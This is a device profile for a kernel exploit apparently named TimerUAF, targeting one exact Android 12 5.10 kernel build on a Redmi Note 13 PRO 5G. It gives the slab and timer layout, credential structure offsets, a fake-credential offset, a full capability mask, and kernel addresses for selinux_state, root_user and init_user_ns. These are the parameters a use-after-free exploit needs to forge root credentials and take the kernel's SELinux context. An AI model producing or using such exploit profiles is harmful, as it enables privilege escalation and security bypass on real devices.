# =====================================================================
# TimerUAF Kernel Profile: Redmi Note 13 PRO 5G (garnet)
# Kernel: 5.10.246-android12-9-00021-gc9ff65e4f0d7-ab15866348
# =====================================================================

[profile]
release = "5.10.246-android12-9-00021-gc9ff65e4f0d7-ab15866348"
schema_version = 1
ksu_kmi = "android12-5.10"

# 5.10 layout, no Samsung DEFEX (Qualcomm device)

# Page & Slab configuration (4K pages)
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# PCP free path (standard for 5.10)
pcp_free = 1
alloc_req_off = 0x10

# Timer configurations (from do_timer_create +0x94)
timer_site = 0xffffffc00827c1fc
timer_alloc = 0x108
timer_node_off = 0x78

# Credentials layout (from kmem_cache_create size=0xa8)
cred_req = 0xa8
cred_alloc = 0xc0
cred_size = 0xa8
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
# 5.10 has no cred->ucounts field. Pin the ucounts write to the group slot.
cred_ucounts_off = 0x90
cred_group_off = 0x90
fake_cred_off = 0x18

# Link-time symbols (kallsyms)
selinux_state = 0xffffffc00aa53b90
panic_on_warn = 0xffffffc00a799dc0

# Task Struct layout
task_cred_off = 0x780
# From tool auto-calculation: copy_process +0x428 -> kmem_cache_alloc
copy_process_low21 = 0x1247cc
task_alloc_bytes = 0x1280

# Capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a7bf5e0
init_user_ns = 0xffffffc00a7bf678

# Tool fix: init_ucounts is missing in 5.10, using ucounts_hashtable instead
init_ucounts = 0xffffffc00a9a1fe8
init_groups = 0xffffffc00a7c0b08

# SELinux (First cred-blob LSM)
selinux_blob_off = 0x0
selinux_sid_kernel = 1
